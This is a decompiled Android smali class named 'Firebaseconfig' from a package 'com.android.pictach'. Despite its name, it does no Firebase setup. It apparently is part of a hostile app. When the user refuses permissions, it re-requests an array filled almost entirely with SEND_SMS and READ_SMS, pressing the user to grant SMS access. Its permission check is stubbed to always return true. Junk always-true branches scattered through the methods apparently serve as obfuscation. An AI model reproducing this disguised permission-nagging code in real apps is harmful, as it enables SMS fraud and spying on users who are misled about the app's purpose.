.class public Lcom/android/pictach/Firebaseconfig;
.super Landroid/app/Activity;
# ep-eqldhlcxyiba
# verified-59160
# processed-59762
# generated-37754
.source "Firebaseconfig.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 0

    const/4 p0, 0x1

    return p0
.end method


# virtual methods
.method public finish()V
    .locals 2

    const/4 v0, 0x0

    .line 100
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1
    if-ne v1, v1, :ep_d_o3a2qd2y
    goto :ep_s_o3a2qd2y
    :ep_d_o3a2qd2y
    nop
    :ep_s_o3a2qd2y
    sput-object v0, Lcom/android/pictach/Utils;->asked:Ljava/lang/Boolean;

    .line 101
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    const/4 v1, 0x1
    if-ne v1, v1, :ep_d_02nw6rbt
    goto :ep_s_02nw6rbt
    :ep_d_02nw6rbt
    nop
    :ep_s_02nw6rbt
    if-lt v0, v1, :cond_0

    .line 102
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 105
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2

    .line 31
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 v1, 0x1
    if-ne v1, v1, :ep_d_1gwtisvb
    goto :ep_s_1gwtisvb
    :ep_d_1gwtisvb
    nop
    :ep_s_1gwtisvb
    const/4 p1, 0x1

    .line 34
    :try_start_0
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Firebase;->FirebaseFOR_prim:Ljava/lang/Boolean;

    const/16 p1, 0x97

    .line 40
    invoke-static {}, Lcom/android/pictach/Utils;->PERMISSIONS()[Ljava/lang/String;

    move-result-object v0

    .line 41
    invoke-static {p0, v0}, Lcom/android/pictach/Firebaseconfig;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 42
    invoke-static {p0, v0, p1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 9

    .line 55
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x97

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 59
    :cond_0
    array-length p1, p3

    const/4 v8, 0x1
    if-ne v8, v8, :ep_d_4z7iy7b7
    goto :ep_s_4z7iy7b7
    :ep_d_4z7iy7b7
    nop
    :ep_s_4z7iy7b7
    if-lez p1, :cond_1

    const/4 p1, 0x0

    aget p3, p3, p1

    const/4 v8, 0x1
    if-ne v8, v8, :ep_d_x49s3b7b
    goto :ep_s_x49s3b7b
    :ep_d_x49s3b7b
    nop
    :ep_s_x49s3b7b
    if-nez p3, :cond_1

    .line 61
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Firebase;->FirebaseFOR_prim:Ljava/lang/Boolean;

    .line 62
    invoke-virtual {p0}, Lcom/android/pictach/Firebaseconfig;->finish()V

    goto :goto_0

    :cond_1
    const-string v0, "android.permission.SEND_SMS"

    const-string v1, "android.permission.SEND_SMS"

    const-string v2, "android.permission.READ_SMS"

    const-string v3, "android.permission.SEND_SMS"

    const-string v4, "android.permission.SEND_SMS"

    const-string v5, "android.permission.SEND_SMS"

    const-string v6, "android.permission.SEND_SMS"

    const-string v7, "android.permission.SEND_SMS"

    const-string v8, "android.permission.SEND_SMS"

    .line 66
    filled-new-array/range {v0 .. v8}, [Ljava/lang/String;

    move-result-object p1

    .line 79
    invoke-static {p0, p1, p2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_0
    return-void
.end method
